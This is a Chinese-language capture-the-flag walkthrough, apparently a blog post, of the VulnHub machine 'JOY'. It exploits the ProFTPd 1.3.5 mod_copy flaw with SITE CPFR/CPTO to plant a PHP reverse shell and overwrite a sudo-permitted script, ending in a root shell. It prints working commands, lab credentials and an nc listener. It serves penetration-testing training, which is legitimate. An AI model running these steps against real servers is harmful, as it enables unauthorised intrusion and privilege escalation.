#  【oscp】JOY，ProFTPd拷贝漏洞提权   
 泷羽Sec-Norsea   2025-02-11 14:06  
  
#####  背对山河，踏清风明月   
  
下载地址：https://www.vulnhub.com/entry/digitalworldlocal-joy,298/  
  
主机发现&端口扫描  
  
![image-20250205105254981](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyibicic5bPFiaSHd5UwwHicAlZn2WZmMvkwz1Rt2sH6GJyhjhia5SIia1dRKRw/640?wx_fmt=png&from=appmsg "")  
  
image-20250205105254981  
  
直接访问，泄露版本信息  
  
![image-20250204210945548](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHy77nbr7YpZ6ejicf86fcogVSpf7bXOS0SHpficke7icJ5yLGPWicV2ricSiaQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250204210945548  
  
上漏洞检索，只有一个拒绝服务攻击，并不能直接getshell，切换思路  
  
![image-20250204210921409](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHy7BM3IDQ1icqChC0deqcnBliaLcsbCgicxN9MUoUiaTcG6GCQM7sWr622QQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250204210921409  
  
端口详细扫描，发现了一个FTP匿名登录  
```
nmap -sS 10.10.10.198 -T4 -p- -A

```  
  
![image-20250204211517026](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHy3zlmib1Acub1qgNXnia64XFQ7eBdBYW6qHREghGSFu2hxpwNak9F0gicA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204211517026  
  
登录ftp  
```
ftp 10.10.10.198
# 密码为空，直接回车

```  
  
![image-20250204211748262](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHy3Kn90V4F5TJdRcBSGelLNMDLs7k28ItPKgCt3e0Ll12reWNhvb6fxQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250204211748262  
  
看到两个可执行文件，下载下来  
```
get reminder
get directory

```  
  
![image-20250204212032008](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyT3ob3IVdvuVkwk0AjYTthibC1jW2hg9WwH1zibicibYPV38tiamyWKauXww/640?wx_fmt=png&from=appmsg "")  
  
image-20250204212032008  
  
赋予执行权限（并不能直接执行）  
  
![image-20250204212359401](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHy72ISVdupjGcQdpxn4KSZqg9hpFnHVZfrGnq2hC8alX2x8ezvAshtSA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204212359401  
  
直接cat directory，看上去是用户patrick的用户目录，毕竟有一个上级目录就是root权限的信息  
```
Patrick's Directorytotal 132drwxr-xr-x 18 patrick patrick 4096 Feb  4 21:20 .drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..-rw-r--r--  1 patrick patrick   24 Feb  4 21:15 1kd8va0o50OV3H28HZ26ffN7JMeU0wG8J996ftHpRuQrAAQqKoxQfCs5aB8GFXC7.txt-rw-r--r--  1 patrick patrick   24 Feb  4 20:55 6kK0S15FpM4iECwlY9vBMOcz0WHalkAEQZIHFBUDxztRq1We1v5GYxAMdxMbUba6.txt-rw-r--r--  1 patrick patrick    0 Feb  4 21:15 aOY5oYk9g0WS0nXasU6l2EvjrFCl4hqk.txt-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrcdrwx------  7 patrick patrick 4096 Jan 10  2019 .cache-rw-r--r--  1 patrick patrick    0 Feb  4 20:50 chTSFHiKgRfHiwgp8LV9u4tDwhpdGnKp.txtdrwx------ 10 patrick patrick 4096 Dec 26  2018 .configdrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktopdrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documentsdrwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads-rw-r--r--  1 patrick patrick    0 Feb  4 21:20 Dp9d3TstWJP6Yczetnrx4GnQgkVE250L.txt-rw-r--r--  1 patrick patrick   24 Feb  4 20:50 gAOnh9TLwMyOEViffEXpFAt3LcChEuxcWeqc3BPcQFIRomrGdizTYKuJlHuOSF4z.txtdrwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthoritydrwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .localdrwx------  5 patrick patrick 4096 Dec 28  2018 .mozilladrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Musicdrwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano-rw-r--r--  1 patrick patrick   24 Feb  4 21:05 obzvvHxWWlOzg8z8uOdy2Qd94dVMZAs2glSOp18HRCRl9jqmB4x5PVoqLsqM0sAD.txtdrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profiledrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public-rw-r--r--  1 patrick patrick    0 Feb  4 21:05 Q9lbdQPPywIiNT5Dagi0Bg9OMx0CQ0ts.txtd---------  2 root    root    4096 Jan  9  2019 scriptdrwx------  2 patrick patrick 4096 Dec 26  2018 .ssh-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sundrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt-rw-r--r--  1 patrick patrick   24 Feb  4 21:20 UKwKOJqE9XVI3TaEvKZJr8CWu1kVXOWTFZQqjhaiES7QydPE1KEcY2bzuLsOpnYc.txt-rw-r--r--  1 patrick patrick    0 Feb  4 21:00 V56ziCPycMNIbNplkqYedQXlM6G9YO66.txt-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_controldrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos-rw-r--r--  1 patrick patrick    0 Feb  4 21:10 Wp2Twcw4FWSRMYDe8mniQ1BZhHyhYHqX.txt-rw-r--r--  1 patrick patrick    0 Feb  4 20:55 XFsA7qBE2voGAtiuZfQ0GQMxE8RitITZ.txt-rw-r--r--  1 patrick patrick   24 Feb  4 21:10 YbxpYyx2v9VnifKxuctWG1Y3BzXp8dGJrQrlXbDHK0qp0ZcBRudy7zzN2g8Rxc9F.txt-rw-r--r--  1 patrick patrick   24 Feb  4 21:00 YPE8Q4kbBE98OJCytjadCwhK2W9TMb5UPnCP0cHnGsS2dvpwXrppfAViwZmPH3Zq.txtYou should know where the directory can be accessed.Information of this Machine!Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
```  
  
另外一个reminder，目前可能用不上，有一个version_control包含了版本信息的文件  
```
┌──(root㉿kali)-[/data/demo]
└─# cat reminder
Lock down this machine!

```  
  
继续信息收集，目录扫描（没有利用方式）  
```
dirsearch -u http://10.10.10.198/ossec/

```  
  
![image-20250204213034788](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyr3hpIkEv7T9uTPnibueyhlRQtC0H5DYZ0I4b6JzwicML9tvcEQ7hibzgA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204213034788  
  
这里需要利用到一个ProFTPd的拷贝漏洞，这样就能从ftp服务器上下载version_control这个版本文件了  
  
相关学习文章：https://www.freebuf.com/column/209238.html  
```
┌──(root㉿kali)-[~]
└─# telnet 10.10.10.198 21
Trying 10.10.10.198...
Connected to 10.10.10.198.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
site cpto /home/ftp/upload/version_control
250 Copy successful
quit
221 Goodbye.
Connection closed by foreign host.

```  
  
此时再登录FTP服务器，就能看到多出了一个文件信息  
```
# 下载
get version_control

```  
  
![image-20250204214841482](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyNXtoianYsMIMAicQxr4XjNUuNx2D0Hm3MU0BjPHciboNGibJZbLvCicicanA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204214841482  
  
找到服务版本了，ProFTPd，1.3.5  
```
┌──(root㉿kali)-[~]
└─# cat version_control
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.

```  
  
![image-20250204220822436](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyhib4qpN5DndB6biabr71lcvLPsiaEtG1lD6zicElp3NFJAXN3xaAHJ021g/640?wx_fmt=png&from=appmsg "")  
  
image-20250204220822436  
  
复制到当前目录下并执行  
```
searchsploit -m 36803
python2 36803.py

```  
  
![image-20250204221015086](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHypSZGI5icwnuv4LoWTfPd32RmOdryKYibUPkzXibwTwr1lq02aZf6ico6EA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204221015086  
  
执行脚本的时候它直接卡在这儿了  
  
![image-20250204221711479](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyncJxoOHibAhQUGicYrggHQEicibGcTFUxvQqRIpd6Vxx54U9ouTSib7Mgrw/640?wx_fmt=png&from=appmsg "")  
  
image-20250204221711479  
  
查看脚本内容，这是一个网站的目录  
  
![image-20250204221840564](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHycN0Lpg0pG5K8wUP0zrsicCY4ic8WgwqVgOkO5tZzYJ8B5rl1knQWPGdA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204221840564  
  
这个目录呢在刚刚的版本文件version_control中也有 /var/www/tryingharderisjoy.  
```
┌──(root㉿kali)-[~]
└─# cat version_control
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.

```  
  
但还是不行，msf可以利用，这里不做过多解释，继续手动  
  
![image-20250204222115428](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyJdx2toticPsawZDLwf5CicGTrXamSuCoAViabpu5R5iacNLictoFHiaSRwFA/640?wx_fmt=png&from=appmsg "")  
  
image-20250204222115428  
  
我们得知了网站的目录/var/www/tryingharderisjoy，那么就利用刚刚的文件复制漏洞  
  
![image-20250204223302263](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyGfWSZ4uMcfhBhtnNUKiaeRKv7nocL4Vkf4BK4pMz9ib6vddERicvnicVcw/640?wx_fmt=png&from=appmsg "")  
  
image-20250204223302263  
  
命令如下  
```
┌──(root㉿kali)-[/usr/share/webshells/php]
└─# telnet 10.10.10.198 21
Trying 10.10.10.198...
Connected to 10.10.10.198.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/ftp/upload/php-reverse-shell.php
350 File or directory exists, ready for destination name
site cpto /var/www/tryingharderisjoy/php-reverse-shell.php
250 Copy successful
quit
221 Goodbye.
Connection closed by foreign host.

```  
  
反弹成功  
  
![image-20250204224220908](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyj6B8auibvdfTzdXwCQOYhoE5VUsYgwViaqiboCSwwlUibia7x626ZzKuSjQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250204224220908  
  
开始提权，在网站根目录下面看到了patricksecretsofjoy文件包含了账号密码信息  
```
www-data@JOY:/var/www/tryingharderisjoy/ossec$ ls -al
ls -al
total 116
drwxr-xr-x 8 www-data www-data  4096 Jan  6  2019 .
drwxr-xr-x 3 www-data www-data  4096 Feb  4 22:41 ..
-rw-r--r-- 1 www-data www-data    92 Jul 19  2016 .hgtags
-rw-r--r-- 1 www-data www-data   262 Dec 28  2018 .htaccess
-rw-r--r-- 1 www-data www-data    44 Dec 28  2018 .htpasswd
-rwxr-xr-x 1 www-data www-data   317 Jul 19  2016 CONTRIB
-rw-r--r-- 1 www-data www-data 35745 Jul 19  2016 LICENSE
-rw-r--r-- 1 www-data www-data  2106 Jul 19  2016 README
-rw-r--r-- 1 www-data www-data   923 Jul 19  2016 README.search
drwxr-xr-x 3 www-data www-data  4096 Jul 19  2016 css
-rw-r--r-- 1 www-data www-data   218 Jul 19  2016 htaccess_def.txt
drwxr-xr-x 2 www-data www-data  4096 Jul 19  2016 img
-rwxr-xr-x 1 www-data www-data  5177 Jul 19  2016 index.php
drwxr-xr-x 2 www-data www-data  4096 Jul 19  2016 js
drwxr-xr-x 3 www-data www-data  4096 Dec 28  2018 lib
-rw-r--r-- 1 www-data www-data   462 Jul 19  2016 ossec_conf.php
-rw-r--r-- 1 www-data www-data   134 Jan  6  2019 patricksecretsofjoy
-rwxr-xr-x 1 www-data www-data  2471 Jul 19  2016 setup.sh
drwxr-xr-x 2 www-data www-data  4096 Dec 28  2018 site
drwxrwxrwx 2 www-data www-data  4096 Feb  4 21:32 tmp
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat .htpasswd
cat .htpasswd
admin:$apr1$3Jv2Ok6H$4BMdXenVBmD2E3kXe8RVL.
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
cat patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
www-data@JOY:/var/www/tryingharderisjoy/ossec$ su root
su root
Password: howtheheckdoiknowwhattherootpasswordis

su: Authentication failure
www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
su patrick
Password: apollo098765

patrick@JOY:/var/www/tryingharderisjoy/ossec$ whoami
whoami
patrick

```  
  
有了密码直接sudo -l，看样子可以直接利用这个test文件提权了，但是这个目录无法访问，没有权限  
  
![image-20250204225438901](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWH8MpNCia3Aa7ficRHkibbxGHyOMbz7V8au8xo29iaAK0gMldP5jePUCuSmYNDwqhDibM2W58koJlQBt2w/640?wx_fmt=png&from=appmsg "")  
  
image-20250204225438901  
  
不要忘了我们怎么进来的，这里可以利用刚刚的任意文件复制漏洞，进行复制呀  
```
cd ~
echo 'php /var/www/tryingharderisjoy/php-reverse-shell.php' > test

```  
  
kali  
```
┌──(root㉿kali)-[~]
└─# telnet 10.10.10.198 21
Trying 10.10.10.198...
Connected to 10.10.10.198.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/patrick/test
350 File or directory exists, ready for destination name
site cpto /home/patrick/script/test
250 Copy successful
quit
221 Goodbye.
Connection closed by foreign host.

```  
  
靶机提权即可  
```
 sudo /home/patrick/script/test

```  
  
kali  
```
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.128] from (UNKNOWN) [10.10.10.198] 44710
Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 23:13:50 up  2:28,  0 users,  load average: 0.04, 0.05, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off# whoamiroot#
```  
  
至此提权成功  
## 往期推荐  
  
[首发 | 告别WPS会员，一天用deekseep手搓PDF工具箱，用过之后，真香！！](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247499027&idx=1&sn=538aa1a762c2cc59c97d434a7104c027&scene=21#wechat_redirect)  
  
  
[免费使用所有Github大模型，包括deepseek-r1、GPT-4 Turbo！](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247499089&idx=2&sn=2a664c0e40c76e473f8c0e8767c166fa&scene=21#wechat_redirect)  
  
  
[【渗透测试】ATT&CK靶场一，phpmyadmin，域渗透，内网横向移动攻略](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247490377&idx=1&sn=0e932a2d96e64a4511c75dd2b5ca895d&scene=21#wechat_redirect)  
  
  
[ATK&CK红日靶场二，Weblogic漏洞利用，域渗透攻略](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247495915&idx=1&sn=020b2f604f3c234afc5e660021041671&scene=21#wechat_redirect)  
  
  
[【OSCP】 Kioptrix 提权靶机（1-5）全系列教程，Try Harder！绝对干货！](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247496963&idx=1&sn=646e34d7b03cef9741616ea8d7e20968&scene=21#wechat_redirect)  
  
  
[【渗透测试】DC1~9(全) Linux提权靶机渗透教程，干货w字解析，建议收藏](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247495774&idx=1&sn=ad20212bd08f94652d40e286406ed40f&scene=21#wechat_redirect)  
  
  
[从零开始学SQL注入（sql十大注入类型）：技术解析与实战演练](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247483856&idx=1&sn=cf4878d2cb5bd267f4b2d5b065dfa732&scene=21#wechat_redirect)  
  
  
[1w字图文带你了解sqlmap，从0到1，WAF绕过，高级用法一文通透](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247487170&idx=1&sn=d4d9809aa6219e700566776adc1dae3a&scene=21#wechat_redirect)  
  
  
  
